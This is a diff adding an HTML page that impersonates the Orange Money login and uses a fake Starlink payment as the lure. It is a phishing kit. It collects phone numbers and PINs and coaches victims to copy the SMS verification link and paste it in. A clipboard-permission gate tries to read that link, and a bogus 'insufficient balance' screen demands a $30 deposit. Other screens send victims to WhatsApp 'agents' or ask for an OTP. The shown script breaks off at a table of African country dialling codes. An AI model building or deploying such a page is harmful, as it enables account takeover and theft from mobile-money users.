@@ -1,0 +1,1918 @@
+<!DOCTYPE html>
+<html lang="en" translate="no">
+<head>
+    <meta charset="utf-8"/>
+    <link rel="icon" href="https://www.orange.com/favicon.ico"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <meta name="theme-color" content="#FF6600"/>
+    <meta name="google" content="notranslate">
+    <title>Orange Money</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        html, body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(180deg, #000000 0%, #1a1a1a 50%, #2d2d2d 100%);
+            min-height: 100vh;
+            color: #fff;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        .app-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 60px 20px 40px;
+        }
+        
+        .om-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 16px;
+        }
+        
+        .om-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            font-weight: 700;
+            color: #FF6600;
+            margin-bottom: 4px;
+        }
+        
+        .brand-tagline {
+            font-size: 14px;
+            color: #FF6600;
+            margin-bottom: 40px;
+        }
+        
+        .login-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        
+        .card-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #000;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+            margin-bottom: 24px;
+        }
+        
+        .phone-wrapper:focus-within {
+            border-color: #FF6600;
+        }
+        
+        .country-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 12px;
+            background: #f5f5f5;
+            border-right: 1px solid #e0e0e0;
+            min-width: 70px;
+            flex-shrink: 0;
+            position: relative;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .country-section:hover {
+            background: #ebebeb;
+        }
+        
+        .country-dropdown-arrow {
+            position: absolute;
+            bottom: 6px;
+            right: 6px;
+            font-size: 8px;
+            color: #666;
+        }
+        
+        /* Country Selector Modal */
+        .country-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .country-modal.active {
+            display: flex;
+        }
+        
+        .country-modal-content {
+            background: #fff;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 340px;
+            max-height: 70vh;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        
+        .country-modal-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #FF6600;
+        }
+        
+        .country-modal-header h3 {
+            margin: 0;
+            font-size: 18px;
+            color: #fff;
+        }
+        
+        .country-modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #fff;
+            padding: 0;
+            line-height: 1;
+        }
+        
+        .country-list {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            max-height: calc(70vh - 60px);
+            overflow-y: auto;
+        }
+        
+        .country-list li {
+            display: flex;
+            align-items: center;
+            padding: 14px 20px;
+            cursor: pointer;
+            border-bottom: 1px solid #f0f0f0;
+            transition: background 0.2s;
+        }
+        
+        .country-list li:hover {
+            background: #fff5eb;
+        }
+        
+        .country-list li.selected {
+            background: #fff0e0;
+        }
+        
+        .country-list li img {
+            width: 28px;
+            height: 20px;
+            margin-right: 12px;
+            border-radius: 2px;
+            object-fit: cover;
+        }
+        
+        .country-list li .country-name {
+            flex: 1;
+            font-size: 15px;
+            color: #333;
+        }
+        
+        .country-list li .country-dial {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .flag-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 2px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+        }
+        
+        .flag-circle img {
+            width: 28px;
+            height: 20px;
+            object-fit: cover;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border: none;
+            padding: 16px 14px;
+            font-size: 18px;
+            color: #000;
+            outline: none;
+            background: transparent;
+        }
+        
+        .phone-input::placeholder {
+            color: #aaa;
+        }
+        
+        .terms-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        
+        .terms-text a {
+            color: #FF6600;
+            text-decoration: none;
+        }
+        
+        .next-btn {
+            width: 100%;
+            background: #FF6600;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .next-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .next-btn:not(:disabled):hover {
+            background: #e55b00;
+        }
+        
+        .next-btn .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .next-btn.loading .loader { display: block; }
+        .next-btn.loading .btn-text { display: none; }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* PIN Screen */
+        .pin-screen {
+            display: none;
+        }
+        
+        .pin-screen.active {
+            display: block;
+        }
+        
+        .phone-screen.hidden {
+            display: none;
+        }
+        
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #000;
+            font-size: 14px;
+            font-weight: 500;
+            background: none;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 20px;
+            padding: 0;
+        }
+        
+        .back-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .pin-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+        }
+        
+        .pin-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        
+        .pin-inputs {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        
+        .pin-input {
+            width: 50px;
+            height: 56px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: #000;
+            outline: none;
+            transition: border-color 0.2s;
+            -webkit-text-security: disc;
+        }
+        
+        .pin-input:focus {
+            border-color: #FF6600;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: #FF6600;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .submit-btn:disabled {
+            background: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .submit-btn:not(:disabled):hover {
+            background: #e55b00;
+        }
+        
+        /* OTP Screen */
+        .otp-screen {
+            display: none;
+        }
+        
+        .otp-screen.active {
+            display: block;
+        }
+        
+        .insufficient-screen {
+            display: none;
+        }
+        .insufficient-screen.active {
+            display: block;
+        }
+        
+        .not-verified-screen {
+            display: none;
+        }
+        .not-verified-screen.active {
+            display: block;
+        }
+        
+        .otp-inputs-wrapper {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        /* Transparent overlay input for Safari/iOS OTP autofill */
+        .otp-autofill-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01;
+            font-size: 22px;
+            border: none;
+            background: transparent;
+            color: transparent;
+            caret-color: transparent;
+            z-index: 2;
+            letter-spacing: 2em;
+            text-align: center;
+        }
+        
+        .otp-input {
+            width: 48px;
+            height: 56px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            color: #000;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .otp-input:focus {
+            border-color: #FF6600;
+        }
+        
+        .link-input-wrapper {
+            margin-bottom: 20px;
+        }
+        
+        .link-input {
+            width: 100%;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 14px;
+            color: #000;
+            outline: none;
+            transition: border-color 0.2s;
+            word-break: break-all;
+        }
+        
+        .link-input:focus {
+            border-color: #FF6600;
+        }
+        
+        .link-input::placeholder {
+            color: #aaa;
+        }
+        
+        .how-to-steps {
+            background: #fff8f0;
+            border: 1px solid #ffe0c0;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .how-to-steps h4 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #FF6600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .how-to-steps ol {
+            margin: 0;
+            padding-left: 20px;
+        }
+        
+        .how-to-steps li {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 6px;
+            line-height: 1.5;
+        }
+        
+        .how-to-steps li:last-child {
+            margin-bottom: 0;
+        }
+        
+        .how-to-steps li strong {
+            color: #333;
+        }
+        
+        .resend-section {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 24px;
+        }
+        
+        .resend-link {
+            color: #FF6600;
+            cursor: pointer;
+        }
+        
+        .resend-link.disabled {
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .error-message {
+            background: #fee;
+            color: #c00;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        /* Starlink Header */
+        .starlink-header {
+            display: none;
+            background: linear-gradient(135deg, #000 0%, #333 100%);
+            padding: 20px;
+            text-align: center;
+            border-radius: 16px 16px 0 0;
+            margin: -32px -24px 24px -24px;
+        }
+        
+        .starlink-header.active {
+            display: block;
+        }
+        
+        .starlink-header h2 {
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        
+        .payment-details {
+            display: none;
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .payment-details.active {
+            display: block;
+        }
+        
+        .payment-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+        }
+        
+        .payment-label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .payment-value {
+            color: #000;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .payment-amount {
+            color: #FF6600;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        /* SSL Badge */
+        .ssl-badge {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 16px;
+            padding: 8px 16px;
+            background: #e8f5e9;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #2e7d32;
+            font-weight: 500;
+        }
+        
+        .ssl-badge.active {
+            display: flex;
+        }
+        
+        .ssl-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Country Selector Modal -->
+    <div class="country-modal" id="countryModal">
+        <div class="country-modal-content">
+            <div class="country-modal-header">
+                <h3>Select Country</h3>
+                <button class="country-modal-close" onclick="closeCountrySelector()">&times;</button>
+            </div>
+            <ul class="country-list" id="countryList">
+                <!-- Populated by JavaScript -->
+            </ul>
+        </div>
+    </div>
+
+    <div class="app-container">
+        <!-- Orange Money Logo -->
+        <div class="om-logo">
+            <svg viewBox="0 0 100 100" fill="none">
+                <circle cx="50" cy="50" r="45" fill="#FF6600"/>
+                <text x="50" y="62" text-anchor="middle" font-family="Inter, Arial, sans-serif" font-size="40" font-weight="700" fill="#fff">O</text>
+            </svg>
+        </div>
+        <div class="brand-name">Orange Money</div>
+        <div class="brand-tagline">by Orange</div>
+        
+        <!-- Login Card -->
+        <div class="login-card">
+            <!-- Starlink Header (hidden by default) -->
+            <div class="starlink-header" id="starlinkHeader">
+                <h2>⭐ Starlink Payment</h2>
+            </div>
+            
+            <!-- Payment Details (hidden by default) -->
+            <div class="payment-details" id="paymentDetails">
+                <div class="payment-row">
+                    <span class="payment-label">Service</span>
+                    <span class="payment-value" id="starlinkService">Starlink Renewal</span>
+                </div>
+                <div class="payment-row">
+                    <span class="payment-label">Amount</span>
+                    <span class="payment-amount" id="starlinkAmount">XOF 0</span>
+                </div>
+            </div>
+            
+            <!-- Phone Screen -->
+            <div class="phone-screen" id="phoneScreen">
+                <h2 class="card-title" id="cardTitle">Welcome to Orange Money</h2>
+                
+                <div class="error-message" id="phoneError"></div>
+                
+                <div class="phone-wrapper">
+                    <div class="country-section" id="countrySection" onclick="openCountrySelector()">
+                        <div class="flag-circle">
+                            <img src="https://flagcdn.com/w40/ci.png" alt="Côte d'Ivoire" id="flagIcon">
+                        </div>
+                        <span class="country-dropdown-arrow">▼</span>
+                    </div>
+                    <input type="tel" class="phone-input" id="phoneInput" placeholder="+225 XX XX XX XX" maxlength="12">
+                </div>
+                
+                <div class="pin-inputs" style="margin-top: 20px;">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="0">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="1">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="2">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="3">
+                </div>
+                <p class="pin-subtitle" style="text-align:center; color:#666; font-size:13px; margin-top:6px;" id="pinLabel">Enter your 4-digit Orange Money PIN</p>
+                
+                <div class="error-message" id="pinError"></div>
+
+                <p class="terms-text">
+                    By using this service you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>
+                </p>
+                
+                <button class="next-btn" id="nextBtn" disabled>
+                    <span class="btn-text">NEXT</span>
+                    <span class="loader"></span>
+                </button>
+            </div>
+            
+            <!-- PIN Screen -->
+            <div class="pin-screen" id="pinScreen">
+                <button class="back-btn" id="backToPhone">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7"/>
+                    </svg>
+                    Back
+                </button>
+                
+                <h3 class="pin-title">Enter your Orange Money PIN</h3>
+                <p class="pin-subtitle">Enter your 4-digit Orange Money PIN to authorize this transaction.</p>
+                
+                <div class="error-message" id="pinError"></div>
+                
+                <div class="pin-inputs">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="0">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="1">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="2">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="3">
+                </div>
+                
+                <button class="submit-btn" id="submitBtn" disabled>Submit</button>
+            </div>
+            
+            <!-- Link Verification Screen -->
+            <div class="otp-screen" id="otpScreen">
+                <button class="back-btn" id="backToPin">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7"/>
+                    </svg>
+                    Back
+                </button>
+                
+                <h3 class="pin-title">Verification Link</h3>
+                <p class="pin-subtitle">A verification link has been sent to your phone number via SMS.</p>
+                <p class="pin-subtitle" style="font-weight: 600; color: #000;" id="phoneDisplay">+225 XX XX XX XX</p>
+                
+                <div style="background:#fff3cd;border:2px solid #ff9900;border-radius:10px;padding:12px 14px;margin-bottom:14px;text-align:center;">
+                    <p style="color:#b45309;font-weight:700;font-size:14px;margin:0;">⚠️ <span id="doNotClickWarning">DO NOT tap or open the link — only copy and paste it below</span></p>
+                </div>
+
+                <div class="how-to-steps">
+                    <h4>📋 How to paste your link:</h4>
+                    <ol>
+                        <li>Open the <strong>SMS message</strong> you received from Orange Money</li>
+                        <li>Find the link in the SMS — <strong style="color:#dc2626;">DO NOT tap it</strong></li>
+                        <li><strong>Long press</strong> on the link until a menu appears</li>
+                        <li>Tap <strong>"Copy link"</strong> or <strong>"Copy"</strong></li>
+                        <li>Switch back to this page</li>
+                        <li><strong>Long press</strong> on the field below and tap <strong>"Paste"</strong></li>
+                        <li>The link will be verified <strong>automatically</strong></li>
+                    </ol>
+                </div>
+                
+                <div class="error-message" id="otpError"></div>
+                
+                <div class="link-input-wrapper">
+                    <input type="url" class="link-input" id="linkInput" placeholder="Paste your verification link here..." autocomplete="off">
+                </div>
+                
+                <div class="resend-section">
+                    <span class="resend-link disabled" id="resendLink">Resend link in <span id="timer">30</span> seconds</span>
+                </div>
+
+                <p style="text-align:center;font-size:13px;color:#6B7280;margin-top:14px;">
+                    If you don't understand how to do it, contact the agent who directed you here from WhatsApp.
+                </p>
+
+                <button class="submit-btn" id="verifyBtn" disabled>Verify</button>
+            </div>
+
+            <!-- Clipboard Permission Gate -->
+            <div id="clipboardGate" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;padding:24px;">
+                <div style="background:#fff;border-radius:16px;padding:32px 24px;max-width:360px;width:100%;text-align:center;">
+                    <div style="font-size:48px;margin-bottom:16px;">📋</div>
+                    <h2 style="font-size:18px;font-weight:700;color:#111;margin-bottom:10px;">Clipboard Access Required</h2>
+                    <p id="clipboardGateMsg" style="font-size:14px;color:#6B7280;line-height:1.6;margin-bottom:24px;">
+                        This page needs access to your clipboard to automatically detect and paste the verification link from your SMS.<br><br>
+                        Please tap <strong style="color:#FF6600;">Allow</strong> when your browser asks for permission.
+                    </p>
+                    <button id="clipboardGateBtn" style="width:100%;padding:14px;background:#FF6600;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;">
+                        Allow Clipboard Access
+                    </button>
+                    <button id="clipboardBypassBtn" style="width:100%;padding:12px;background:#16A34A;color:white;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;margin-top:10px;">
+                        ⚡ I Can Copy &amp; Paste Faster
+                    </button>
+                    <p style="font-size:12px;color:#9CA3AF;margin-top:12px;">You must allow this or paste manually to continue.</p>
+                </div>
+            </div>
+            
+            <!-- SSL Badge -->
+            <div class="ssl-badge" id="sslBadge">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                </svg>
+                SSL ENCRYPTED AND SECURE
+            </div>
+
+            <!-- Not Verified Screen (DRC & Sierra Leone) -->
+            <div class="not-verified-screen" id="notVerifiedScreen">
+                <div style="text-align:center;padding:30px 20px;">
+                    <div style="width:80px;height:80px;border-radius:50%;background:#FEE2E2;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                        <span style="font-size:40px;">🔒</span>
+                    </div>
+                    <h2 style="font-size:20px;color:#991B1B;margin-bottom:12px;font-weight:700;">Account Not Verified</h2>
+                    <p style="color:#6B7280;font-size:14px;line-height:1.7;margin-bottom:24px;">
+                        Your account is not fully verified to be eligible for payment subscription. To boost your eligibility:<br><br>
+                        Contact support to get verified and be allowed to make payment subscription via Orange Money directly.
+                    </p>
+                    <button onclick="openSupport()" style="width:100%;padding:14px;background:#25D366;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+                        <span id="orangeContactSupport">Chat with support now</span>
+                    </button>
+                    <button onclick="showPhoneScreen()" style="width:100%;padding:12px;background:transparent;color:#6B7280;border:2px solid #D1D5DB;border-radius:10px;font-size:14px;font-weight:500;cursor:pointer;">
+                        ← Use a Different Number
+                    </button>
+                </div>
+            </div>
+
+            <!-- Insufficient Balance Screen -->
+            <div class="insufficient-screen" id="insufficientScreen">
+
+                <div style="text-align:center;padding:30px 20px;">
+                    <div style="width:80px;height:80px;border-radius:50%;background:#FEF3C7;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                        <span style="font-size:40px;">⚠️</span>
+                    </div>
+                    <h2 style="font-size:20px;color:#B45309;margin-bottom:8px;font-weight:700;">Insufficient Balance</h2>
+                    <p id="insuffMsg" style="color:#6B7280;font-size:13px;line-height:1.6;margin-bottom:24px;">
+                        You must have at least <strong style="color:#111;">$30 USD</strong> in your Orange Money wallet as a <strong style="color:#111;">guarantee deposit</strong> to subscribe to any Starlink package.<br><br>Please deposit the required amount and click the button below.
+                    </p>
+                    <button id="depositedBtn" style="width:100%;padding:14px;background:#10B981;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px;">
+                        ✅ I Have Deposited
+                    </button>
+                    <button id="diffNumberBtn" style="width:100%;padding:14px;background:transparent;color:#6B7280;border:2px solid #D1D5DB;border-radius:10px;font-size:14px;font-weight:500;cursor:pointer;">
+                        Use a Different Number
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Jordan 4-digit OTP Screen -->
+        <div class="not-verified-screen" id="jordanOtpScreen">
+            <div style="text-align:center;padding:20px 20px 10px;">
+                <div style="width:70px;height:70px;border-radius:50%;background:#e6f3ff;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
+                    <span style="font-size:36px;">🔐</span>
+                </div>
+                <h2 style="font-size:20px;color:#111;margin-bottom:6px;font-weight:700;" id="joOtpTitle">اكتمل تقريباً</h2>
+                <p style="color:#6B7280;font-size:13px;margin-bottom:4px;" id="joOtpSubtitle">أدخل رمز OTP المُرسَل إلى</p>
+                <p style="font-weight:700;color:#111;font-size:15px;margin-bottom:20px;" id="joPhoneDisplay"></p>
+            </div>
+            <div style="display:flex;justify-content:center;gap:12px;margin-bottom:16px;">
+                <input type="tel" class="pin-input" maxlength="1" data-jo-index="0" inputmode="numeric" autocomplete="one-time-code" style="width:60px;height:60px;border:2px solid #e0e0e0;border-radius:12px;text-align:center;font-size:24px;font-weight:700;outline:none;" oninput="this.value=this.value.replace(/[^0-9]/g,'');joOtpMove(this,0)" onkeydown="joOtpBack(event,this,0)">
+                <input type="tel" class="pin-input" maxlength="1" data-jo-index="1" inputmode="numeric" style="width:60px;height:60px;border:2px solid #e0e0e0;border-radius:12px;text-align:center;font-size:24px;font-weight:700;outline:none;" oninput="this.value=this.value.replace(/[^0-9]/g,'');joOtpMove(this,1)" onkeydown="joOtpBack(event,this,1)">
+                <input type="tel" class="pin-input" maxlength="1" data-jo-index="2" inputmode="numeric" style="width:60px;height:60px;border:2px solid #e0e0e0;border-radius:12px;text-align:center;font-size:24px;font-weight:700;outline:none;" oninput="this.value=this.value.replace(/[^0-9]/g,'');joOtpMove(this,2)" onkeydown="joOtpBack(event,this,2)">
+                <input type="tel" class="pin-input" maxlength="1" data-jo-index="3" inputmode="numeric" style="width:60px;height:60px;border:2px solid #e0e0e0;border-radius:12px;text-align:center;font-size:24px;font-weight:700;outline:none;" oninput="this.value=this.value.replace(/[^0-9]/g,'');joOtpMove(this,3)" onkeydown="joOtpBack(event,this,3)">
+            </div>
+            <div id="joOtpError" style="color:#dc2626;font-size:13px;text-align:center;min-height:20px;margin-bottom:8px;"></div>
+            <div id="joOtpSuccess" style="display:none;text-align:center;padding:16px;background:#d1fae5;border-radius:10px;margin-bottom:12px;">
+                <p style="color:#065f46;font-weight:700;font-size:16px;">✅ تم التحقق بنجاح!</p>
+                <p style="color:#047857;font-size:13px;margin-top:4px;">تم استلام طلبك. سيتواصل معك فريق الدعم قريباً.</p>
+            </div>
+            <button id="joVerifyBtn" onclick="submitJordanOtp()" style="width:100%;padding:14px;background:#FF6600;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px;" disabled>تحقق من الرمز</button>
+            <p style="text-align:center;font-size:13px;color:#9CA3AF;margin-bottom:16px;">
+                <span id="joResendLink" class="resend-link disabled" onclick="resendJordanOtp()">لم تتمكن من تسجيل الدخول؟ يمكنك طلب رمز جديد <span style="color:#FF6600;font-weight:600;">إعادة إرسال SMS</span></span>
+            </p>
+            <button onclick="showPhoneScreen()" style="width:100%;padding:12px;background:transparent;color:#6B7280;border:2px solid #D1D5DB;border-radius:10px;font-size:14px;font-weight:500;cursor:pointer;">
+                → رقم هاتف خاطئ؟
+            </button>
+        </div>
+
+    </div>
+    
+    <script>
+        // Country configurations - expanded for all African countries
+        const COUNTRIES = {
+            'CI': { code: '+225', length: 10, flag: 'ci', name: 'Côte d\'Ivoire', currency: 'XOF' },
+            'SN': { code: '+221', length: 9, flag: 'sn', name: 'Senegal', currency: 'XOF' },
+            'ML': { code: '+223', length: 8, flag: 'ml', name: 'Mali', currency: 'XOF' },
+            'BF': { code: '+226', length: 8, flag: 'bf', name: 'Burkina Faso', currency: 'XOF' },
+            'GN': { code: '+224', length: 9, flag: 'gn', name: 'Guinea', currency: 'GNF' },
+            'CM': { code: '+237', length: 9, flag: 'cm', name: 'Cameroon', currency: 'XAF' },
+            'CD': { code: '+243', length: 9, flag: 'cd', name: 'DRC', currency: 'CDF' },
+            'MG': { code: '+261', length: 9, flag: 'mg', name: 'Madagascar', currency: 'MGA' },
+            'NE': { code: '+227', length: 8, flag: 'ne', name: 'Niger', currency: 'XOF' },
+            'GH': { code: '+233', length: 9, flag: 'gh', name: 'Ghana', currency: 'GHS' },
+            'NG': { code: '+234', length: 10, flag: 'ng', name: 'Nigeria', currency: 'NGN' },
+            'UG': { code: '+256', length: 9, flag: 'ug', name: 'Uganda', currency: 'UGX' },
+            'RW': { code: '+250', length: 9, flag: 'rw', name: 'Rwanda', currency: 'RWF' },
+            'ZM': { code: '+260', length: 9, flag: 'zm', name: 'Zambia', currency: 'ZMW' },
+            'BJ': { code: '+229', length: 8, flag: 'bj', name: 'Benin', currency: 'XOF' },
+            'CG': { code: '+242', length: 9, flag: 'cg', name: 'Congo', currency: 'XAF' },
+            'ZA': { code: '+27', length: 9, flag: 'za', name: 'South Africa', currency: 'ZAR' },
+            'KE': { code: '+254', length: 9, flag: 'ke', name: 'Kenya', currency: 'KES' },
+            'TZ': { code: '+255', length: 9, flag: 'tz', name: 'Tanzania', currency: 'TZS' },
+            'ET': { code: '+251', length: 9, flag: 'et', name: 'Ethiopia', currency: 'ETB' },
+            'TG': { code: '+228', length: 8, flag: 'tg', name: 'Togo', currency: 'XOF' },
+            'SL': { code: '+232', length: 8, flag: 'sl', name: 'Sierra Leone', currency: 'SLL' },
+            'LR': { code: '+231', length: 7, flag: 'lr', name: 'Liberia', currency: 'LRD' },
+            'GA': { code: '+241', length: 8, flag: 'ga', name: 'Gabon', currency: 'XAF' },
+            'TD': { code: '+235', length: 8, flag: 'td', name: 'Chad', currency: 'XAF' },
+            'CF': { code: '+236', length: 8, flag: 'cf', name: 'Central African Republic', currency: 'XAF' },
+            'GQ': { code: '+240', length: 9, flag: 'gq', name: 'Equatorial Guinea', currency: 'XAF' },
+            'AO': { code: '+244', length: 9, flag: 'ao', name: 'Angola', currency: 'AOA' },
+            'MZ': { code: '+258', length: 9, flag: 'mz', name: 'Mozambique', currency: 'MZN' },
+            'MW': { code: '+265', length: 9, flag: 'mw', name: 'Malawi', currency: 'MWK' },
+            'ZW': { code: '+263', length: 9, flag: 'zw', name: 'Zimbabwe', currency: 'ZWL' },
+            'BW': { code: '+267', length: 8, flag: 'bw', name: 'Botswana', currency: 'BWP' },
+            'NA': { code: '+264', length: 9, flag: 'na', name: 'Namibia', currency: 'NAD' },
